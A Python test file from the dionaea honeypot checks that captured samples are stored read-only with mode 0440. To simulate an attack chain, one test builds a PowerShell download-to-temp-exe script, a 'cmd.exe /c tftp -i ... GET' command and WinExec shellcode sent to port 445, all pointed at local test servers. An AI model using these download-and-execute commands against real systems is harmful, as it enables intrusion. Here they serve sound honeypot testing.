# This file is part of the dionaea honeypot
#
# SPDX-FileCopyrightText: none
#
# SPDX-License-Identifier: CC0-1.0

"""A stored sample (binaries/<md5>) is read-only and never executable: mode 0440.

The folder is on the host of the operator (a bind mount in T-Pot), so a captured
file must not be executable there by accident. The mode is set by store.py on
every path that stores a file; the paths are:

- FTP STOR (upload.py, as the SMB1 write)
- HTTP POST (http.py)
- the TFTP client and the curl module: a script downloaded over TFTP by shellcode,
  the URL in it fetched over HTTP (the chain of test_emu_scripts.py)
"""

import hashlib
import socket
import stat
import time
import uuid

from servers import HttpServer, TftpServer
from test_emu import winexec_shellcode
from test_ftp import _command, _login, _passive_data_socket, _read_reply
from test_smoke import _file_part, _post_multipart, _wait_for_binary
from test_upload import _unique

SAMPLE_MODE = 0o440


def _mode(path):
    return stat.S_IMODE(path.stat().st_mode)


def test_ftp_stor_sample_is_not_executable(dionaea_host, binaries_dir):
    content = _unique("mode ftp")
    with socket.create_connection((dionaea_host, 21), timeout=10) as ctrl:
        _login(ctrl)
        with _passive_data_socket(ctrl, dionaea_host) as data_sock:
            assert _command(ctrl, "STOR mode-%s.bin" % uuid.uuid4().hex[:8]).startswith("150")
            data_sock.sendall(content)
        assert _read_reply(ctrl).startswith("226")
        _command(ctrl, "QUIT")
    path = _wait_for_binary(binaries_dir, hashlib.md5(content).hexdigest())
    assert path.read_bytes() == content
    assert _mode(path) == SAMPLE_MODE, oct(_mode(path))


def test_http_post_sample_is_not_executable(dionaea_host, binaries_dir):
    payload = ("MZ mode http %s" % uuid.uuid4().hex).encode()
    boundary = "mode" + uuid.uuid4().hex
    body = (_file_part(boundary, payload, "Content-Type: application/octet-stream\r\n")
            + ("--%s--\r\n" % boundary).encode())
    response, _ = _post_multipart(dionaea_host, body, boundary)
    assert response.startswith(b"HTTP/1."), response[:100]
    path = _wait_for_binary(binaries_dir, hashlib.md5(payload).hexdigest())
    assert path.read_bytes() == payload
    assert _mode(path) == SAMPLE_MODE, oct(_mode(path))


def test_downloaded_samples_are_not_executable(dionaea_host, my_ip, query_db, binaries_dir):
    """The script (TFTP client) and the payload (curl module) of a download chain."""
    token = uuid.uuid4().hex[:12]
    payload = ("payload mode %s\n" % token).encode() * 20
    name = "payload-%s.bin" % token
    http_server = HttpServer({"/" + name: payload}, my_ip)
    payload_url = "http://%s:%d/%s" % (my_ip, http_server.port, name)
    script = (
        "$wc = New-Object System.Net.WebClient\r\n"
        "$url = \"%s\"\r\n"
        "$wc.DownloadFile($url, \"c:\\\\windows\\\\temp\\\\x.exe\")\r\n" % payload_url
    ).encode()
    script_name = "script-%s.txt" % token
    tftp_server = TftpServer({script_name: script}, my_ip)
    tftp_server.start()
    try:
        command = "cmd.exe /c tftp -i %s GET %s" % (my_ip, script_name)
        with socket.create_connection((dionaea_host, 445), timeout=10) as sock:
            sock.sendall(winexec_shellcode(command.encode()))
            deadline = time.monotonic() + 40
            rows = []
            while time.monotonic() < deadline:
                rows = query_db("SELECT download_md5_hash FROM downloads WHERE download_url = ?", (payload_url,))
                if rows:
                    break
                time.sleep(0.5)
        assert rows, "%s was not downloaded within 40 s" % payload_url
        for content in (script, payload):
            path = _wait_for_binary(binaries_dir, hashlib.md5(content).hexdigest())
            assert path.read_bytes() == content
            assert _mode(path) == SAMPLE_MODE, "%s: %s" % (path.name, oct(_mode(path)))
    finally:
        tftp_server.close()
        http_server.close()


def test_no_stored_sample_has_an_execute_bit(binaries_dir):
    """Every file the other tests caused: md5 names are 0440, temp files (in .incoming, 0700) are never executable."""
    incoming = binaries_dir / ".incoming"
    assert incoming.is_dir() and _mode(incoming) == 0o700, "binaries/.incoming: %s" % oct(_mode(incoming))
    for path in list(binaries_dir.iterdir()) + list(incoming.iterdir()):
        if path == incoming:
            continue
        mode = _mode(path)
        assert not mode & 0o111, "%s: %s" % (path.name, oct(mode))
        if len(path.name) == 32:
            assert mode == SAMPLE_MODE, "%s: %s" % (path.name, oct(mode))


def test_no_bistream_has_an_execute_bit(data_dir):
    """The streams of the stream dumper (mkstemp: 0600) are not executable either."""
    directory = data_dir / "bistreams"
    found = [p for p in directory.rglob("*") if p.is_file()]
    assert found, "the stream dumper wrote no file, the check would be empty"
    for path in found:
        assert not _mode(path) & 0o111, "%s: %s" % (path, oct(_mode(path)))
